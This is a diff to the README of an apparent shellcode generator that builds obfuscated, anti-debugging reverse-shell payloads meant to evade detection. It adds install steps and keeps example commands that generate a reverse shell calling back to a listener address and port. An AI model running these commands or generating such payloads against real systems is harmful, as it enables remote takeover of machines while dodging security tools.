@@ -36,9 +36,23 @@ The final shellcode is printed in a format suitable for embedding in C or Python
 
 This script is designed for scenarios where evasion from detection is critical, combining multiple layers of obfuscation and anti-analysis techniques into one payload generation process.
 
-
+## Installing ##
+```
+git clone https://github.com/daedalus/yapt/
+virtualenv venv
+source venv/bin/activate
+cd yapt
+python setup.py install
+```
+## Running ##
 Basic reverse shell:
+
 `python3 main.py --ip 192.168.1.100 --port 4444`
 
 Obfuscated version with multiple techniques:
+
 `python3 main.py --ip 192.168.1.100 --port 4444 --junk --obfuscate-path --anti-debug --rle --xor-key 0xAA`
+
+## License ##
+
+MIT
